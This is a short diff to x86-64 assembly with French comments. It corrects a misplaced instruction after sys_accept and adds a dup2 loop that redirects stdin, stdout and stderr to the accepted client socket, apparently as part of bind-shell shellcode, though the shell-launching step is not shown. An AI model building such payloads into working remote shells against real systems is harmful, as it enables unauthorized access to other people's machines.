@@ -32,6 +32,16 @@ _start:
     mov rax, 43 ; sys_accept
     xor rsi, rsi ; addr = NULL (0) 
     xor rdx, rdx ; addrlen = NULL (0) 
-    syscall mov 
+    syscall 
     
-    r9, rax ; Sauvegarder client_fd dans R9
+    mov r9, rax ; Sauvegarder client_fd dans R9
+
+    ; dup2 loop
+    mov rsi, 2 ; stdout, stdin, stderr
+loop_dup:
+    mov rax, 33 ; sys_dup2
+    mov rdi, r9 ; client_fd
+    syscall
+    dec rsi     ; -1
+    jns loop_dup ; rsi >= 0
+
